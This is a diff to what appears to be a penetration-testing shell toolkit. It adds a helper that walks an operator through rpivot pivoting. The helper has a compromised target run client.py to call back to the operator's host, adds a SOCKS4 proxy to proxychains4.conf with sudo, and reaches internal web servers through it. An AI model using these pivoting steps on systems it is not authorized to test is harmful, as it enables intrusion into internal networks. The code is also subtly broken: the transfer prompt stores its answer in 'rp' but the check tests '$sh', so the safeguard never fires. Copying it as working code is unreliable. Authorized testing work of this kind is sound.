@@ -20,7 +20,8 @@ Using Automated Tools
 ------------
 nb-pivot-chisel                       # TODO
 nb-pivot-sshuttle                     ssh pivoting with sshuttle (without the need of proxychains)
-nb-pivot-rpivot-server                web server pivoting with rpivot
+nb-pivot-rpivot-server                web server pivoting with rpivot server.py
+nb-pivot-rpivot-client                web server pivoting with rpivot client.py
 
 Using SSH
 ---------
@@ -116,13 +117,23 @@ nb-pivot-rpivot-server() {
 }
 
 nb-pivot-rpivot-client() {
+    nb-vars-set-lhost
+
     __ask "Did you transfer the 'rpivot' to the target? (y/n)"
     local rp && __askvar rp "ANSWER"
 
     if [[ $sh == "n" ]]; then
       __err "Transfer 'rpivot' to target before proceeding."
-      __info "Use nb-srv-scp-up (scp -r)"
+      __info "Use nb-srv-scp-up (use scp -r)"
       exit 1
     fi
 
+    __info "Run client.py from pivot target:"
+    __ok "cd rpivot"
+    __ok "python2.7 client.py --server-ip ${__LHOST} --server-port 9999"
+    echo
+    __info "Add the proxy to proxychains4.conf using command:"
+    __ok "echo 'socks4 	127.0.0.1 ${__LPORT}' | sudo tee -a /etc/proxychains4.conf"
+    echo
+    __info "Use proxychains to access teh web server: 'proxychains firefox <target_ip>:80'"
 }
